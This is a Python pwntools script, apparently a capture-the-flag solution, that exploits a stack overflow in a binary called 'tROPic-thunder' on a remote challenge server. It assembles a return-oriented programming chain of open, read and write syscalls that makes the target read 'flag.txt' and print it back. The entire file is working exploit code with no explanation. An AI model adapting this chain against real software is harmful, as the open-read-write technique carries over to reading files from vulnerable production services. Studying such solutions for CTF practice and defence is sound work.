from pwn import *
import sys

elf = ELF("tROPic-thunder")

# io = process(elf.path)
io = remote('thunder.sdc.tf', 1337)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io, gdbscript='b *0x484105')

pop_rdi_ret = next(elf.search(asm('pop rdi ; ret'), executable=True))
pop_rsi_ret = next(elf.search(asm('pop rsi ; ret'), executable=True))
pop_rdx_ret = next(elf.search(asm('pop rdx ; ret'), executable=True))
pop_rax_ret = next(elf.search(asm('pop rax ; ret'), executable=True))
syscall = next(elf.search(asm('syscall ; ret'), executable=True))
flag_addr = elf.bss() + 0x200

p = b'A' * 0x78

# read(0, addr, 0x200)
p += p64(pop_rdi_ret)
p += p64(0)
p += p64(pop_rsi_ret)
p += p64(flag_addr)
p += p64(pop_rdx_ret)
p += p64(0x200)
p += p64(pop_rax_ret)
p += p64(0)
p += p64(syscall)

# open(addr, 0, 0)
p += p64(pop_rdi_ret)
p += p64(flag_addr)
p += p64(pop_rsi_ret)
p += p64(0)
p += p64(pop_rdx_ret)
p += p64(0)
p += p64(pop_rax_ret)
p += p64(2)
p += p64(syscall)

# read(3, addr, 0x200)
p += p64(pop_rdi_ret)
p += p64(3)
p += p64(pop_rsi_ret)
p += p64(flag_addr + 0x200)
p += p64(pop_rdx_ret)
p += p64(0x200)
p += p64(pop_rax_ret)
p += p64(0)
p += p64(syscall)

# write(1, addr, 0x200)
p += p64(pop_rdi_ret)
p += p64(1)
p += p64(pop_rsi_ret)
p += p64(flag_addr + 0x200)
p += p64(pop_rdx_ret)
p += p64(0x200)
p += p64(pop_rax_ret)
p += p64(1)
p += p64(syscall)

print(f'payload len: {hex(len(p))}')

io.sendlineafter(b'one!\n', p)

io.sendline(b'flag.txt\x00')

io.interactive()